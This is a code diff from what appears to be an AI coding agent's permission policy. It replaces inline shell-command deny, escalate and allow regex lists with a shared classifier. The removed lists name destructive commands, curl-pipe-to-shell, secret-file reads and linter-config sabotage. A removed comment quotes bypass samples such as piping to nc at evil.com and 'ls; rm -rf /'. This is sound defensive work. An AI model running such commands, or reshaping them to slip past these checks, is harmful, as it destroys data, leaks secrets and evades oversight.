@@ -35,6 +35,8 @@ import {
 	isKnownCanonicalRole,
 	resolveGeneratedAgentRole,
 } from '../config/schema';
+import { classifyCommand } from '../security/command-classifier.js';
+import { isPolicyProtectedPath } from '../security/protected-path-policy.js';
 import { normalizePath } from '../utils/path';
 
 // ---------------------------------------------------------------------------
@@ -242,85 +244,6 @@ const PROTECTED_PATH_DEFAULTS = [
 	'release-please-config.json',
 ];
 
-// Shell command classification.
-// Anything destructive (rm, kill, dd, shutdown) is denied outright.
-// Anything network/permission-changing (curl POST, sudo, chmod, ssh) is
-// medium-risk and escalates to critic.
-// Read-only inspection (cat, ls, pwd, git log) is allowed.
-const SAFE_SHELL_PATTERNS: RegExp[] = [
-	/^(?:cat|head|tail|less|more|file|stat|wc|sort|uniq|tr|cut|awk|sed)\b/,
-	/^(?:ls|pwd|whoami|hostname|uname|env|date|which|type|tree)\b/,
-	/^(?:echo|printf|true|false|test)\b/,
-	/^(?:grep|rg|ag|find|fd|locate)\b/,
-	/^git\s+(?:status|log|show|diff|branch|describe|rev-parse|rev-list|ls-files|config\s+--get|remote\s+-v|stash\s+list)/,
-	/^(?:bun|npm|yarn|pnpm)\s+(?:run\s+(?:typecheck|lint|test|build)|test|typecheck|lint)\b/,
-	/^node\s+(?:--version|-v|--input-type)/,
-	/^bunx\s+biome\s+(?:ci|check|lint|format)\b/,
-];
-
-const DENY_SHELL_PATTERNS: RegExp[] = [
-	// destructive filesystem
-	/\brm\s+(?:-[^\s]*\s+)*(?:\/|~|\.)?\s*$|\brm\s+-[rRf]+/i,
-	/\bdd\s+if=/i,
-	/\bmkfs\b/i,
-	/\bshutdown\b|\breboot\b|\bhalt\b|\bpoweroff\b/i,
-	/\b(?:chown|chmod)\s+-R\s+/i,
-	/\bkill\s+-9\b/i,
-	// process group destruction
-	/\bpkill\b|\bkillall\b/i,
-	// destructive git
-	/\bgit\s+push\s+--force(?!-with-lease)/i,
-	/\bgit\s+push\s+(?:[^\s]+\s+)?(?:main|master|production|prod)\b/i,
-	/\bgit\s+reset\s+--hard\b/i,
-	/\bgit\s+clean\s+-(?:f|d|x)/i,
-	/\bgit\s+branch\s+-D\b/i,
-	/\bgit\s+checkout\s+\.|\bgit\s+restore\s+\./i,
-	// secrets / credentials
-	/\b(?:cat|head|tail|less|more)\s+[^\n]*(?:\.env|credentials|id_rsa|id_ed25519|\.pem|\.key)/i,
-	/\bprintenv\b.*(?:SECRET|TOKEN|KEY|PASSWORD)/i,
-	// supply chain / curl-pipe-shell
-	/\bcurl\s+[^|]*\|\s*(?:sh|bash|zsh|fish)\b/i,
-	/\bwget\s+[^|]*\|\s*(?:sh|bash|zsh|fish)\b/i,
-	// permission grants
-	/\bsudo\s+(?:rm|chmod|chown|dd|mkfs|shutdown)/i,
-	// production deploy/migration footguns
-	/\bnpm\s+publish\b/i,
-	/\bbun\s+publish\b/i,
-	/\bbunx?\s+publish\b/i,
-	/\bterraform\s+(?:apply|destroy)\b/i,
-	/\bkubectl\s+(?:delete|apply\s+-f)/i,
-	/\bdrop\s+(?:database|table)\b/i,
-	// config sabotage: sed -i targeting config files with error/warn/off replacement
-	/\bsed\s+-i\b(?=[^\n]*\b(?:biome\.json|eslintrc|oxlintrc)\b)(?=[^\n]*\b(?:error|warn|off)\b)/i,
-	// Redirect config sabotage: cat >, tee commands writing to config files with severity changes
-	/\b(?:cat|tee)\b[^\n]*>\s*[^\n]*\b(biome\.json|eslintrc|oxlintrc)\b[^\n]*\b(error|warn|off)\b/i,
-];
-
-const ESCALATE_SHELL_PATTERNS: RegExp[] = [
-	/\bcurl\b/i,
-	/\bwget\b/i,
-	/\bssh\b/i,
-	/\bscp\b/i,
-	/\brsync\b/i,
-	/\bsudo\b/i,
-	/\bchmod\b/i,
-	/\bchown\b/i,
-	/\bnpm\s+(?:install|i|add)\b/i,
-	/\bbun\s+(?:install|i|add|remove|update)\b/i,
-	/\byarn\s+(?:install|add|remove|upgrade)\b/i,
-	/\bpnpm\s+(?:install|add|remove|update)\b/i,
-	/\bpip\s+install\b/i,
-	/\bgit\s+push\b/i,
-	/\bgit\s+pull\b/i,
-	/\bgit\s+rebase\b/i,
-	/\bgit\s+merge\b/i,
-	/\bgit\s+commit\b/i,
-	// config file write detection: sed -i, echo, printf, cat redirecting to config files
-	/\b(sed\s+-i|echo\s+|printf\s+)[^\n]*\b(biome\.jsonc?|eslintrc|eslint\.config|oxlintrc|prettierrc|secretscanignore|golangci|tsconfig\.json|tsconfig\.[^.]+\.json)\b/i,
-	// Config file writes via cat/tee redirect
-	/\b(?:cat|tee)\b[^\n]*>\s*[^\n]*\b(biome\.jsonc?|eslintrc|eslint\.config|oxlintrc|prettierrc|secretscanignore|golangci|tsconfig\.json|tsconfig\.[^.]+\.json)\b/i,
-];
-
 // ---------------------------------------------------------------------------
 // Helpers
 // ---------------------------------------------------------------------------
@@ -359,20 +282,6 @@ function isWithinDirectory(target: string, root: string): boolean {
 	return resolvedTarget.startsWith(withSep);
 }
 
-// Protected names that must be matched against ANY path segment (not just
-// prefix). Submodule .git, vendor/.swarm, packages/x/package.json should all
-// be flagged. (H5 fix.)
-const SEGMENT_PROTECTED = new Set<string>([
-	'.git',
-	'.swarm',
-	'package.json',
-	'package-lock.json',
-	'bun.lock',
-	'CHANGELOG.md',
-	'.release-please-manifest.json',
-	'release-please-config.json',
-]);
-
 export function isProtectedPath(
 	filePath: string,
 	config: FullAutoPolicyConfig | undefined,
@@ -383,28 +292,14 @@ export function isProtectedPath(
 		const np = normalizePath(prefix);
 		if (normalized === np || normalized.startsWith(`${np}/`)) return true;
 	}
-	const segments = normalized.split('/').filter(Boolean);
 	const allowDefaults = config?.permission_policy?.allow_defaults !== false;
-	if (allowDefaults) {
-		// H5: walk every segment; nested .git / .swarm / package.json count.
-		for (const seg of segments) {
-			if (SEGMENT_PROTECTED.has(seg)) return true;
-		}
-	}
-	const protectedList = [
-		...(allowDefaults ? PROTECTED_PATH_DEFAULTS : []),
-		...((config?.permission_policy?.protected_paths as string[]) ?? []),
-	];
-	for (const candidate of protectedList) {
-		const c = normalizePath(candidate);
-		if (!c) continue;
-		if (normalized === c) return true;
-		if (normalized.startsWith(`${c}/`)) return true;
-		// Custom config entries may also be bare segment names — match each
-		// path segment against them.
-		if (!c.includes('/') && segments.includes(c)) return true;
-	}
-	return false;
+	return isPolicyProtectedPath(normalized, {
+		includeDefaults: allowDefaults,
+		additional: [
+			...(allowDefaults ? PROTECTED_PATH_DEFAULTS : []),
+			...((config?.permission_policy?.protected_paths as string[]) ?? []),
+		],
+	});
 }
 
 export function classifyPathRisk(
@@ -496,66 +391,45 @@ export function classifyPathRisk(
 	};
 }
 
-// Shell metacharacters that change the meaning of a "safe-prefix" command.
-// If any of these appear, we escalate even when the prefix matches a SAFE
-// pattern. C3 fix: prevents `cat README.md > /etc/passwd`,
-// `echo hi | nc evil.com 4444`, `ls; rm -rf /`, and similar bypasses.
-const SHELL_METACHARACTER_PATTERN = /[|&;<>`$]|\$\(|\\\n/;
+const FULL_AUTO_SECRET_READ_PATTERN =
+	/\b(?:cat|head|tail|less|more)\s+[^\n]*(?:\.env|credentials|id_rsa|id_ed25519|\.pem|\.key)\b/i;
+const FULL_AUTO_SECRET_ENV_PATTERN =
+	/\bprintenv\b.*(?:SECRET|TOKEN|KEY|PASSWORD)/i;
+const FULL_AUTO_PRIMARY_PUSH_PATTERN =
+	/\bgit\s+push\s+(?:[^\s]+\s+)?(?:main|master|production|prod)\b/i;
 
 export function classifyCommandRisk(
 	command: string,
 	_cwd: string,
 	_context: { directory: string },
 ): { decision: 'allow' | 'deny' | 'escalate_critic'; reason: string } {
-	if (!command || typeof command !== 'string') {
+	if (
+		FULL_AUTO_SECRET_READ_PATTERN.test(command) ||
+		FULL_AUTO_SECRET_ENV_PATTERN.test(command) ||
+		FULL_AUTO_PRIMARY_PUSH_PATTERN.test(command)
+	) {
 		return {
-			decision: 'escalate_critic',
+			decision: 'deny',
 			reason:
-				'shell command empty or non-string — cannot classify deterministically',
+				'full-auto consumer policy: command reads secrets or targets a primary branch push',
 		};
 	}
-	const trimmed = command.trim();
-	for (const re of DENY_SHELL_PATTERNS) {
-		if (re.test(trimmed)) {
-			return {
-				decision: 'deny',
-				reason: `shell command matches deny pattern (${re.source})`,
-			};
-		}
-	}
-	// C3: presence of shell metacharacters disqualifies a command from the
-	// deterministic SAFE allowlist. Escalate so the critic decides.
-	const hasMetacharacter = SHELL_METACHARACTER_PATTERN.test(trimmed);
-	if (!hasMetacharacter) {
-		for (const re of SAFE_SHELL_PATTERNS) {
-			if (re.test(trimmed)) {
-				return {
-					decision: 'allow',
-					reason: 'shell command matches deterministically safe pattern',
-				};
-			}
-		}
-	}
-	for (const re of ESCALATE_SHELL_PATTERNS) {
-		if (re.test(trimmed)) {
-			return {
-				decision: 'escalate_critic',
-				reason: `shell command matches escalate pattern (${re.source})`,
-			};
-		}
-	}
-	// Unknown command (or safe-prefix command containing metacharacters) —
-	// escalate to critic so it can decide.
-	if (hasMetacharacter) {
+	const classification = classifyCommand(command);
+	if (
+		classification.aggregate === 'catastrophic' ||
+		classification.aggregate === 'destructive'
+	) {
 		return {
-			decision: 'escalate_critic',
-			reason:
-				'shell command contains metacharacters (|, &, ;, <, >, $, backtick) — verify with critic',
+			decision: 'deny',
+			reason: `shared classifier: ${classification.aggregate}`,
 		};
+	}
+	if (classification.aggregate === 'safe') {
+		return { decision: 'allow', reason: 'shared classifier: safe' };
 	}
 	return {
 		decision: 'escalate_critic',
-		reason: 'shell command not in deterministic allow/deny set',
+		reason: `shared classifier: ${classification.aggregate}`,
 	};
 }
 
